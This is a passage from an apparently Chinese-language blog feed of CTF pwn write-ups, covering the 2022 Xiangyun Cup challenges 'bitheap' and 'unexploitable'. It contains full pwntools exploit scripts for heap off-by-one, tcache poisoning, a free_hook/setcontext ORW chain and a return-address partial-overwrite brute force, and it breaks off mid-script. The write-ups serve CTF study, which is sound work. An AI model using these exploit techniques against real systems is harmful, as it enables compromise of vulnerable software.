class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>ru(<span class="hljs-string">&#x27;Here is your gift: 0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>stdout=libc_base+<span class="hljs-number">0x1ed6a0</span><br><span class="hljs-comment">#debug()</span><br>se(p64(stdout))<br><span class="hljs-comment">#debug()</span><br>payload=p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(mmap)+p64(mmap+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="å°ç»“">å°ç»“</h2><p>è¿˜æœ‰5é“é¢˜æ²¡æ•´å‡ºæ¥ï¼Œè®°å½•ä¸€ä¸‹ï¼Œæ‡’å¾—æ•´äº†ï¼Œåˆ†åˆ«ä¸ºï¼š</p><p>è¿™æ˜¯å †ğŸ--------IOåˆ©ç”¨,orwæ— open</p><p>KMario------------kernel_pwn</p><p>code me plz-----shellcodeï¼Œorwæ— open</p><p>Farewell----------kernel_pwn</p><p>orw me plz------ä¹Ÿæ˜¯orwæ²¡æœ‰opençš„æƒ…å†µ</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ•´æ•°æº¢å‡º</tag>
      
      <tag>æ•°ç»„è¶Šç•Œ</tag>
      
      <tag>IO_leak</tag>
      
      <tag>orw</tag>
      
      <tag>shellocde</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ret2shellocde</tag>
      
      <tag>GOT Hijacking</tag>
      
      <tag>format</tag>
      
      <tag>ret2csu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022ç¬¬ä¸‰å±Šç¥¥äº‘æ¯ç½‘ç»œå®‰å…¨å¤§èµ›pwn</title>
    <link href="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/"/>
    <url>/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>å°±åšå‡ºäº†ä¸¤é“pwnï¼Œåˆ†åˆ«ä¸ºbitheapå’Œunexploitableï¼Œä¹Ÿæ˜¯æ¯”èµ›ä¸­è§£å‡ºäººæ•°æœ€å¤šçš„ä¸¤é“pwnã€‚å…ˆæ”¾è¿™ä¸¤é“é¢˜ç›®ï¼Œåç»­å¤ç°äº†å…¶ä»–é¢˜ç›®å†ä¸Šä¼ ã€‚</p><h2 id="bitheap">bitheap</h2><p>è¿™é¢˜ä¸sandboxheapæ˜¯åŒä¸€é“é¢˜ï¼Œåªæ˜¯åè€…å¤šåŠ äº†ä¸ªæ²™ç›’ä¿æŠ¤ã€‚ä½†æ˜¯è¿™é¢˜æ˜¯åœ¨sandboxheapåé¢æ”¾å‡ºæ¥çš„â€¦</p><h3 id="0x01ç¨‹åºåˆ†æ">0x01ç¨‹åºåˆ†æ</h3><p>libcç‰ˆæœ¬Ubuntu GLIBC 2.27-3ubuntu1.6ï¼Œè¿™æ¬¡æ¯”èµ›å‡ ä¹éƒ½æ˜¯2.27çš„</p><p>ä¿æŠ¤å…¨å¼€</p><p>ç¨‹åºå­˜åœ¨off by one</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/bitheapbug.png" alt="bitheapbug"></p><p>ç„¶ååŒæ ·åœ¨editåŠŸèƒ½é‡Œæœ‰ä¸ªå‡½æ•°ï¼Œæœ‰ä¸€ä¸ªå¯¹æ¯ä¸ªå­—èŠ‚é€†åºçš„æ“ä½œ</p><blockquote><p>ä¾‹ï¼šå¦‚æœæˆ‘ä»¬è¦è¾“å…¥0x02</p><p>å°±è¦è¾“å…¥å­—ç¬¦ä¸²  <code>â€™01000000â€˜</code>,å®ƒæ˜¯<code>â€˜00000010â€™</code>çš„é€†åº</p></blockquote><p>æˆ‘ä»¬è¦å†™ä¸ªå‡½æ•°å¤„ç†ä¸‹å®ƒçš„è½¬æ¢</p><p>ç„¶åå…¶ä»–åŠŸèƒ½éƒ½é½å…¨äº†</p><h3 id="0x02åˆ©ç”¨æ€è·¯">0x02åˆ©ç”¨æ€è·¯</h3><p>è¿™é¢˜çš„è§£æ³•å’Œå»å¹´çš„[PassWordBox_FreeVersion](<a href="https://blog.csdn.net/m0_51251108/article/details/127452277?spm=1001.2014.3001.5501">2021 ç¥¥äº‘æ¯PassWordBox_FreeVersion_Nqoinaençš„åšå®¢-CSDNåšå®¢</a>)å¾ˆåƒ</p><p>æˆ‘ä»¬å°±ç”¨off by nullï¼Œé€šè¿‡å †é£æ°´ä½¿unsortbinå‘ä¸Šåˆå¹¶ï¼Œé€ æˆå †å—é‡å ï¼Œä½¿ä¸¤ä¸ªå †ç”³è¯·åˆ°åŒä¸€å—åœ°å€ï¼Œé¡ºä¾¿æ³„éœ²äº†libc,heapçš„åœ°å€</p><p>æ¥ç€æˆ‘ä»¬é€ æˆtcache poisoning ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å‘free_hookï¼Œå¯ä»¥æ”¹free_hookä¸ºsetcontext+53,å†™å…¥orw</p><p>äº¦å¯ä»¥ç›´æ¥æ”¹free_hookä¸ºsystem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./bitheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br>orw=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="unexploitable">unexploitable</h2><h3 id="0x01ç¨‹åºåˆ†æ-2">0x01ç¨‹åºåˆ†æ</h3><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E4%BF%9D%E6%8A%A4.png" alt="unexpä¿æŠ¤"></p><p>ä¿æŠ¤å°±canaryæ²¡å¼€</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E7%A8%8B%E5%BA%8F.png" alt="unexpç¨‹åº"></p><p>ç¨‹åºå°±ä¸€ä¸ªread</p><p>è¿™é¢˜å…¶å®é™åˆ¶çš„å¾ˆæ­»äº†ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡å•¥å¥½çš„æ‰‹æ®µï¼Œä¹Ÿæ²¡æ³•æ‰¾gadgetï¼Œåªèƒ½æ”¹æ”¹retçš„åœ°å€</p><h3 id="0x02åˆ©ç”¨æ€è·¯-2">0x02åˆ©ç”¨æ€è·¯</h3><p>æˆ‘ä»¬æƒ³åŠæ³•è¦retåˆ°ä¸€ä¸ªlibcæ®µçš„åœ°å€å†æ”¹ä¸ºogå°±è¡Œ</p><p>å¯ä»¥å‘ç°readçš„retåœ°å€ç¦»libc_start_main+231å·®0x10</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A3.png" alt="unexpè§£"></p><p>æˆ‘ä»¬åªè¦æ”¹retçš„æœ€åä¸€å­—èŠ‚ä¸º0xD1ï¼Œå¯ä»¥rsp-0x10å°±èƒ½retåˆ°libc_start_main+231äº†</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A31.png" alt="unexpè§£1"></p><p>æˆ‘ä»¬æ”¹ä¸ºogï¼Œç„¶åå®é™…æœ‰12ä¸ªä½ä¸ç¡®å®šï¼Œçˆ†ç ´1/4096æ¦‚ç‡æˆåŠŸ</p><p>ï¼ˆç„¶åè¿™ä¸ªçˆ†ç ´è„šæœ¬å¯èƒ½æœ‰äº›é—®é¢˜ï¼Œæœ¬åœ°å¯è¡Œï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./unexploitable&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = 